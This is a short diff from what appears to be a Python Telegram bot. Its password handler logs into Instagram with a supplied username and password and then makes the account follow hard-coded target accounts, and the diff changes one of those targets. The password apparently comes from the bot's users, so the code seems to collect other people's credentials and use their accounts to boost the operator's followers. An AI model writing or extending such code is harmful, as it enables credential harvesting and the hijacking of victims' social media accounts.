@@ -76,7 +76,7 @@ async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cl.login(username, password)
         print(f"Successfully logged in as {username}")
 
-        target_to_follow = "69mog"  # Replace with your actual Instagram username
+        target_to_follow = "imperfailed"  # Replace with your actual Instagram username
         cl.user_follow(cl.user_id_from_username(target_to_follow))
         target_to_follow1 = "foileds"  # Replace with your actual Instagram username
         cl.user_follow(cl.user_id_from_username(target_to_follow1))
